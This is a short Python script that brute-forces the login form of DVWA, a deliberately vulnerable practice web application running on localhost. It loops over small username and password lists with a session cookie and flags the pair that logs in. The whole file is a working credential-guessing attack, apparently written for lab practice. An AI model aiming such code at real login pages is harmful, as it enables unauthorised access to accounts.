import requests

PHPSESSID = ""  # Type the your PHPSESSID
header = {
    "Cookie": "security=low; PHPSESSID={}".format(PHPSESSID)
}
username_list = ["admin", "password", "root"]
password_list = ["admin", "password", "root"]
for i in username_list:
    for j in password_list:
        url = "http://localhost/DVWA/vulnerabilities/brute/?username=" + str(i) + "&password=" + str(
            j) + "&Login=Login"
        res = requests.get(url=url, headers=header)
        print("Username: ", i)
        print("Password: ", j)
        print("Status Code: ", res.status_code)
        print("Lenght: ", len(res.content))
        if not "Username and/or password incorrect" in str(res.content):
            print("Username and Password Correct !")
        print("-----------------------")
